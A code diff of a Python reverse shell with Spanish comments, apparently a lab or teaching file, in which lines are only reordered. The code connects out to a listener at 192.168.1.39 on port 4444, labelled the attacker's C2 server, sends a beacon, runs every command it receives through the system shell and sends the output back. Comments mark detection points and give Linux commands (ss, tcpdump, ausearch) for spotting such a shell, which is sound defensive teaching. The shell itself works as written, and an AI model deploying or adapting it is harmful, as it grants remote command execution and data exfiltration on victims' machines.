@@ -19,6 +19,7 @@ import socket, subprocess
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ CREACIÓN DEL SOCKET                                                     │
 # └─────────────────────────────────────────────────────────────────────────┘
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # socket.socket() → Crea un endpoint de comunicación de red
     # AF_INET         → Familia de direcciones IPv4 (ej: 192.168.1.39)
@@ -26,11 +27,11 @@ import socket, subprocess
     #
     # 🛡️ DETECCIÓN: La creación del socket no es visible en red
     # 🛡️ COMANDO MANJARO: sudo lsof -i -P -n | grep python
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ CONEXIÓN SALIENTE AL ATACANTE - PUNTO DE DETECCIÓN #1 ⚠️                │
 # └─────────────────────────────────────────────────────────────────────────┘
+connection.connect(("192.168.1.39", 4444))
 
     # connect()       → Inicia conexión TCP al servidor del atacante
     # 192.168.1.39    → IP del atacante (C2 server)
@@ -38,53 +39,48 @@ connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # 🛡️ DETECCIÓN #1: Conexión SALIENTE a puerto 4444 (Firewall/IDS)
     # 🛡️ COMANDO MANJARO: sudo ss -antp | grep 4444
-connection.connect(("192.168.1.39", 4444))
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ ENVÍO DE BEACON - PUNTO DE DETECCIÓN #2 ⚠️                              │
 # └─────────────────────────────────────────────────────────────────────────┘
+connection.send("\n[+] Conexion Exitosamente Establecida\n".encode('utf-8'))
 
     # send()          → Envía datos al atacante a través del túnel TCP
     # encode('utf-8') → Convierte string a bytes (requerido en Python 3)
 
     # 🛡️ DETECCIÓN #2: Firma de texto "Conexion Exitosamente" (DLP/IDS)
     # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -X
-connection.send("\n[+] Conexion Exitosamente Establecida\n".encode('utf-8'))
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ BUCLE PRINCIPAL - ESPERA DE COMANDOS                                    │
 # └─────────────────────────────────────────────────────────────────────────┘
-
-    # 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos)
-while True:
+while True:# 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos)
     
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ RECEPCIÓN DE COMANDOS - PUNTO DE DETECCIÓN #3                       │
     # └─────────────────────────────────────────────────────────────────────┘
-
+    command = connection.recv(1024)
         # recv(1024) → Espera y recibe hasta 1024 bytes del atacante
         
         # 🛡️ DETECCIÓN #3: Tráfico entrante en conexión establecida
-        # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -n -v
-    command = connection.recv(1024)
+        # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -n -v    
     
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️ (EL MÁS CRÍTICO)    │
     # └─────────────────────────────────────────────────────────────────────┘
-    
+    resultadosComando = subprocess.check_output(command, shell=True)
+   
         # check_output() → Ejecuta el comando en el sistema operativo
         # shell=True     → Ejecuta a través del shell del sistema (/bin/sh)
         
         # 🛡️ DETECCIÓN #4: python → bash/sh (auditd/EDR) - EL MAYOR IoC
         # 🛡️ COMANDO MANJARO: sudo ausearch -c python3 --start recent
-    resultadosComando = subprocess.check_output(command, shell=True)
     
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ ENVÍO DE RESULTADOS - EXFILTRACIÓN ⚠️                               │
     # └─────────────────────────────────────────────────────────────────────┘
-    
+    connection.send(resultadosComando)
         # send() → Envía resultados al atacante (exfiltración)
         #
         # 🛡️ DETECCIÓN #5: Datos salientes sensibles (DLP/Wireshark)
         # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w exfil.pcap
-    connection.send(resultadosComando)
